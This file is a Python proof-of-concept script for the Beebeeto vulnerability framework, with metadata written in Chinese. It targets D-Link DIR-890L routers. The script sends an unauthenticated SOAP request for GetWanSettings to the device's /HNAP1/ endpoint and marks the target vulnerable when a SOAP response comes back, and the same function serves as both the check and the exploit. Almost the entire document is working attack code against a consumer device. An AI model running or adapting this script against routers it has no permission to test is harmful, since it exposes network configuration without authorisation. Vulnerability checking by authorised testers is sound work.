#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0090',
            'name': 'D-link DIR-890L /HNAP1 未授权信息泄漏漏洞 POC',
            'author': 'tmp',
            'create_date': '2015-04-24',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'D-link',
            'vul_version': ['DIR-890L'],
            'type': 'Information Disclosure',
            'tag': ['D-link DIR-890L系统漏洞', '/HNAP1漏洞', '路由器漏洞POC'],
            'desc': 'D_link /HNAP1 unauthenticated remote query information',
            'references': ['http://www.freebuf.com/vuls/64521.html',
                           'http://www.devttys0.com/2015/04/hacking-the-d-link-dir-890l/'],
        },
    }


    @classmethod
    def verify(cls, args):
        verify_url = '%s/HNAP1/' % args['options']['target']
        soap = {'SOAPAction': '"http://purenetworks.com/HNAP1/GetWanSettings"'}
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        req = requests.get(verify_url, headers=soap)
        if req.status_code == 200 and 'xmlns:soap' in req.content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())